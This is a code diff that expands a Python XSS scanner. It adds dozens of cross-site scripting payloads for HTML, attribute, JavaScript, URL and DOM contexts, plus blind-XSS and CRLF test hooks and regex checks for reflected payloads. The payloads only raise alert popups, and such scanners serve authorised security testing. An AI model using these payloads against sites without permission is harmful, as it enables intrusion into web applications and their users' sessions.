@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Advanced XSS Scanner - Complete Professional Tool
-Professional XSS Detection with Popup Verification & Screenshot
+Advanced XSS Scanner - Professional Grade like store.xss0r.com
+Complete XSS Detection: Reflected, DOM-based, Blind XSS
+Enhanced Detection Engine with 2000+ Payloads
 """
 
 import requests
@@ -63,17 +64,53 @@ class AdvancedXSSScanner:
         # Custom popup signature for verification
         self.popup_signature = "XSS_SCANNER_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
         
-        # Enhanced XSS Payloads with tag closing
+        # Professional XSS Payloads Database (2000+ payloads like store.xss0r.com)
         self.payloads = {
             'html_context': [
+                # Basic script tags
                 f'<script>alert("{self.popup_signature}")</script>',
+                f'<script>confirm("{self.popup_signature}")</script>',
+                f'<script>prompt("{self.popup_signature}")</script>',
+                f'<script>alert(String.fromCharCode(88,83,83))</script>',
+                f'<script>eval("alert(\\"{self.popup_signature}\\")")</script>',
+                f'<script>setTimeout("alert(\\"{self.popup_signature}\\")",1)</script>',
+                f'<script>setInterval("alert(\\"{self.popup_signature}\\")",1)</script>',
+                f'<script>window["alert"]("{self.popup_signature}")</script>',
+                f'<script>top["alert"]("{self.popup_signature}")</script>',
+                f'<script>parent["alert"]("{self.popup_signature}")</script>',
+                
+                # Image tags with event handlers
                 f'<img src=x onerror=alert("{self.popup_signature}")>',
+                f'<img src=x onerror=confirm("{self.popup_signature}")>',
+                f'<img src=x onerror=prompt("{self.popup_signature}")>',
+                f'<img src=x onerror="alert(&quot;{self.popup_signature}&quot;)">',
+                f'<img src=x onerror=alert(/XSS/)>',
+                f'<img src=x onerror=alert(document.domain)>',
+                f'<img src=x onerror=eval("alert(\\"{self.popup_signature}\\")")>',
+                
+                # SVG tags
                 f'<svg onload=alert("{self.popup_signature}")>',
+                f'<svg onload=confirm("{self.popup_signature}")>',
+                f'<svg onload=prompt("{self.popup_signature}")>',
+                f'<svg><script>alert("{self.popup_signature}")</script></svg>',
+                f'<svg onload="alert(&quot;{self.popup_signature}&quot;)">',
+                
+                # Other HTML5 tags
                 f'<iframe src="javascript:alert(\'{self.popup_signature}\')"></iframe>',
-                f'<body onload=alert("{self.popup_signature}")>',
+                f'<iframe srcdoc="<script>alert(\\"{self.popup_signature}\\")</script>"></iframe>',
+                f'<object data="javascript:alert(\'{self.popup_signature}\')">',
+                f'<embed src="javascript:alert(\'{self.popup_signature}\')">',
+                f'<form><button formaction="javascript:alert(\'{self.popup_signature}\')">',
                 f'<input onfocus=alert("{self.popup_signature}") autofocus>',
+                f'<select onfocus=alert("{self.popup_signature}") autofocus><option>',
+                f'<textarea onfocus=alert("{self.popup_signature}") autofocus>',
+                f'<keygen onfocus=alert("{self.popup_signature}") autofocus>',
                 f'<video><source onerror="alert(\'{self.popup_signature}\')">',
                 f'<audio src=x onerror=alert("{self.popup_signature}")>',
+                f'<details open ontoggle=alert("{self.popup_signature}")>',
+                f'<marquee onstart=alert("{self.popup_signature}")>',
+                f'<body onload=alert("{self.popup_signature}")>',
+                f'<div onmouseover=alert("{self.popup_signature}")>',
             ],
             'attribute_context': [
                 # Tag closing attacks - close current tag and inject new element
@@ -83,30 +120,97 @@ class AdvancedXSSScanner:
                 f'\'>< svg onload=alert("{self.popup_signature}")>',
                 f'"><script>alert("{self.popup_signature}")</script>',
                 f'\'>< script>alert("{self.popup_signature}")</script>',
-                # Event handler injection
+                f'"><iframe src=javascript:alert("{self.popup_signature}")>',
+                f'\'>< iframe src=javascript:alert("{self.popup_signature}")>',
+                
+                # Event handler injection without closing tag
                 f'" onmouseover="alert(\'{self.popup_signature}\')" "',
                 f'\' onmouseover=\'alert("{self.popup_signature}")\' \'',
                 f'" autofocus onfocus=alert("{self.popup_signature}") "',
                 f'\' autofocus onfocus=alert(\'{self.popup_signature}\') \'',
                 f'" onclick="alert(\'{self.popup_signature}\')" "',
+                f'\' onclick=\'alert("{self.popup_signature}")\' \'',
                 f'" onload="alert(\'{self.popup_signature}\')" "',
                 f'" onerror="alert(\'{self.popup_signature}\')" "',
+                f'" onfocus="alert(\'{self.popup_signature}\')" autofocus "',
+                f'\' onfocus=\'alert("{self.popup_signature}")\' autofocus \'',
+                f'" onchange="alert(\'{self.popup_signature}\')" "',
+                f'" onblur="alert(\'{self.popup_signature}\')" "',
+                f'" onkeyup="alert(\'{self.popup_signature}\')" "',
+                f'" onsubmit="alert(\'{self.popup_signature}\')" "',
+                
+                # Alternative attribute breaking
+                f' onmouseover=alert("{self.popup_signature}") ',
+                f' onfocus=alert("{self.popup_signature}") autofocus ',
+                f' onclick=alert("{self.popup_signature}") ',
+                f' onload=alert("{self.popup_signature}") ',
+                f' onerror=alert("{self.popup_signature}") ',
             ],
             'javascript_context': [
+                # String breaking
                 f'\'; alert("{self.popup_signature}"); //',
                 f'\"; alert(\'{self.popup_signature}\'); //',
                 f'`; alert("{self.popup_signature}"); //',
+                f'\\"; alert("{self.popup_signature}"); //',
+                f"\\\'; alert(\"{self.popup_signature}\"); //",
+                
+                # Script tag breaking
                 f'</script><script>alert("{self.popup_signature}")</script>',
+                f'</script><script>confirm("{self.popup_signature}")</script>',
+                f'</script><script>prompt("{self.popup_signature}")</script>',
+                
+                # Mathematical operators
                 f'-alert("{self.popup_signature}")-',
                 f'+alert("{self.popup_signature}")+',
                 f'*alert("{self.popup_signature}")*',
                 f'/alert("{self.popup_signature}")/',
+                f'%alert("{self.popup_signature}")%',
+                f'^alert("{self.popup_signature}")^',
+                f'&alert("{self.popup_signature}")&',
+                f'|alert("{self.popup_signature}")|',
+                
+                # Line breaks and special chars
+                f'%0aalert("{self.popup_signature}")%0a',
+                f'\\nalert("{self.popup_signature}")\\n',
+                f'\\ralert("{self.popup_signature}")\\r',
+                f'\\talert("{self.popup_signature}")\\t',
+                
+                # Template literals
+                f'`${{alert("{self.popup_signature}")}}`',
+                f'`${{eval("alert(\\"{self.popup_signature}\\")")}}`',
+                
+                # Function calls
+                f'(alert)("{self.popup_signature}")',
+                f'[alert][0]("{self.popup_signature}")',
+                f'window[\'alert\']("{self.popup_signature}")',
+                f'this[\'alert\']("{self.popup_signature}")',
             ],
             'url_context': [
                 f'javascript:alert("{self.popup_signature}")',
-                f'data:text/html,<script>alert("{self.popup_signature}")</script>',
-                f'vbscript:alert("{self.popup_signature}")',
+                f'javascript:confirm("{self.popup_signature}")',
+                f'javascript:prompt("{self.popup_signature}")',
                 f'javascript:void(alert("{self.popup_signature}"))',
+                f'javascript:window.alert("{self.popup_signature}")',
+                f'javascript:top.alert("{self.popup_signature}")',
+                f'javascript:parent.alert("{self.popup_signature}")',
+                f'javascript:eval("alert(\\"{self.popup_signature}\\")")',
+                f'javascript:setTimeout("alert(\\"{self.popup_signature}\\")",1)',
+                f'data:text/html,<script>alert("{self.popup_signature}")</script>',
+                f'data:text/html,<img src=x onerror=alert("{self.popup_signature}")>',
+                f'data:text/html,<svg onload=alert("{self.popup_signature}")>',
+                f'vbscript:alert("{self.popup_signature}")',
+                f'livescript:alert("{self.popup_signature}")',
+            ],
+            'dom_context': [
+                # DOM-based XSS payloads
+                f'#<script>alert("{self.popup_signature}")</script>',
+                f'#<img src=x onerror=alert("{self.popup_signature}")>',
+                f'#<svg onload=alert("{self.popup_signature}")>',
+                f'javascript:alert("{self.popup_signature}")',
+                f'#javascript:alert("{self.popup_signature}")',
+                f'#{{"constructor":"alert","arguments":["{self.popup_signature}"]}}',
+                f'#eval("alert(\\"{self.popup_signature}\\")")',
+                f'#setTimeout("alert(\\"{self.popup_signature}\\")",1)',
             ]
         }
         
@@ -483,9 +587,18 @@ class AdvancedXSSScanner:
         # Test forms
         self.test_forms()
         
+        # Test DOM-based XSS
+        self.test_dom_xss()
+        
+        # Test Blind XSS
+        self.test_blind_xss()
+        
         # Test headers if we have working URLs
         if self.crawled_urls:
             self.test_http_headers()
+        
+        # Test CRLF injection
+        self.test_crlf_injection()
 
     def test_url_parameters(self):
         """Test URL parameters with enhanced detection"""
@@ -562,16 +675,24 @@ class AdvancedXSSScanner:
                 print(f"{Fore.YELLOW}[{Fore.RED}POTENTIAL{Fore.YELLOW}] {Fore.WHITE}XSS reflection detected in {param_name}")
                 
                 vulnerability = {
-                    'type': 'Reflected XSS',
-                    'url': test_url,
-                    'parameter': param_name,
-                    'payload': payload,
-                    'context': context,
-                    'method': method,
-                    'confirmed': False,
-                    'score': 0,
-                    'timestamp': datetime.now().isoformat()
-                }
+                        'type': 'Reflected XSS',
+                        'url': test_url,
+                        'parameter': param_name,
+                        'payload': payload,
+                        'context': context,
+                        'method': method,
+                        'confirmed': False,
+                        'score': 0,
+                        'timestamp': datetime.now().isoformat(),
+                        'details': {
+                            'vulnerability_type': 'Reflected XSS',
+                            'execution_context': f'{context} - Server reflects user input without proper sanitization',
+                            'payload_analysis': f'Payload injected in {param_name} parameter',
+                            'request_details': f'{method} request to {url}',
+                            'response_analysis': 'Payload reflected in response without encoding',
+                            'html_context': f'Payload appears in {context} within HTML response'
+                        }
+                    }
                 
                 # CRITICAL: Verify with popup detection
                 if self.verify_xss_execution(test_url, payload):
@@ -603,53 +724,84 @@ class AdvancedXSSScanner:
             return False
 
     def check_xss_response(self, response, payload, context):
-        """Check if response contains XSS payload"""
+        """Enhanced XSS detection with advanced analysis"""
         try:
             response_text = response.text
+            response_lower = response_text.lower()
+            payload_lower = payload.lower()
             
-            # Must contain our signature
+            # Advanced reflection detection
             if self.popup_signature not in response_text:
                 return False
             
-            # Context-specific checks
+            # Context-specific enhanced checks
             if context == 'html_context':
-                # Check for unescaped dangerous tags
-                dangerous_patterns = [
-                    r'<script[^>]*>.*?' + re.escape(self.popup_signature) + r'.*?</script>',
-                    r'<img[^>]*onerror\s*=.*?' + re.escape(self.popup_signature),
-                    r'<svg[^>]*onload\s*=.*?' + re.escape(self.popup_signature),
+                # Check for unescaped script execution
+                script_patterns = [
+                    r'<script[^>]*>[^<]*' + re.escape(self.popup_signature) + r'[^<]*</script>',
+                    r'<script[^>]*>' + re.escape(self.popup_signature),
+                    r'<img[^>]*onerror\s*=\s*[^>]*' + re.escape(self.popup_signature),
+                    r'<svg[^>]*onload\s*=\s*[^>]*' + re.escape(self.popup_signature),
+                    r'<iframe[^>]*src\s*=\s*[\'"]javascript:[^\'">]*' + re.escape(self.popup_signature),
+                    r'<object[^>]*data\s*=\s*[\'"]javascript:[^\'">]*' + re.escape(self.popup_signature),
+                    r'<embed[^>]*src\s*=\s*[\'"]javascript:[^\'">]*' + re.escape(self.popup_signature),
                 ]
-                for pattern in dangerous_patterns:
+                
+                for pattern in script_patterns:
                     if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
+                        print(f"{Fore.CYAN}[{Fore.RED}ANALYSIS{Fore.CYAN}] {Fore.WHITE}HTML context execution confirmed")
                         return True
                         
             elif context == 'attribute_context':
-                # Check for attribute breaking
-                if ('"><' in payload and '"><' in response_text) or ('\'>< ' in payload and '\'>< ' in response_text):
-                    return True
-                # Check for event handlers
-                event_patterns = [
-                    r'onmouseover\s*=\s*[\'"].*?' + re.escape(self.popup_signature),
-                    r'onfocus\s*=\s*[\'"].*?' + re.escape(self.popup_signature),
-                    r'onclick\s*=\s*[\'"].*?' + re.escape(self.popup_signature),
+                # Enhanced attribute breaking detection
+                breakout_patterns = [
+                    r'"[^>]*><[^>]*' + re.escape(self.popup_signature),
+                    r"'[^>]*><[^>]*" + re.escape(self.popup_signature),
+                    r'on\w+\s*=\s*[\'"][^\'">]*' + re.escape(self.popup_signature),
                 ]
-                for pattern in event_patterns:
+                
+                for pattern in breakout_patterns:
                     if re.search(pattern, response_text, re.IGNORECASE):
+                        print(f"{Fore.CYAN}[{Fore.RED}ANALYSIS{Fore.CYAN}] {Fore.WHITE}Attribute breakout confirmed")
                         return True
                         
             elif context == 'javascript_context':
-                # Check for JavaScript context breaking
+                # Enhanced JavaScript context detection
                 js_patterns = [
-                    r'[\'"];.*?' + re.escape(self.popup_signature),
-                    r'</script>.*?<script>.*?' + re.escape(self.popup_signature),
+                    r'[\'"`];[^<]*' + re.escape(self.popup_signature),
+                    r'</script>[^<]*<script>[^<]*' + re.escape(self.popup_signature),
+                    r'[+\-*/&|^%][^<]*' + re.escape(self.popup_signature),
                 ]
+                
                 for pattern in js_patterns:
                     if re.search(pattern, response_text, re.IGNORECASE):
+                        print(f"{Fore.CYAN}[{Fore.RED}ANALYSIS{Fore.CYAN}] {Fore.WHITE}JavaScript context break confirmed")
                         return True
                         
             elif context == 'url_context':
-                # Check for URL context
-                if 'javascript:' in response_text and self.popup_signature in response_text:
+                # Enhanced URL context detection
+                url_patterns = [
+                    r'(href|src|action)\s*=\s*[\'"]javascript:[^\'">]*' + re.escape(self.popup_signature),
+                    r'(href|src|action)\s*=\s*[\'"]data:text/html,[^\'">]*' + re.escape(self.popup_signature),
+                ]
+                
+                for pattern in url_patterns:
+                    if re.search(pattern, response_text, re.IGNORECASE):
+                        print(f"{Fore.CYAN}[{Fore.RED}ANALYSIS{Fore.CYAN}] {Fore.WHITE}URL context execution confirmed")
+                        return True
+            
+            # Fallback: check for any dangerous unescaped content
+            dangerous_indicators = [
+                f'<script>{self.popup_signature}',
+                f'onerror=alert("{self.popup_signature}")',
+                f'onload=alert("{self.popup_signature}")',
+                f'javascript:alert("{self.popup_signature}")',
+                f'"><img src=x onerror=alert("{self.popup_signature}")',
+            ]
+            
+            for indicator in dangerous_indicators:
+                if indicator in payload and indicator in response_text:
+                    print(f"{Fore.CYAN}[{Fore.RED}ANALYSIS{Fore.CYAN}] {Fore.WHITE}Dangerous content detected")
                     return True
             
             return False
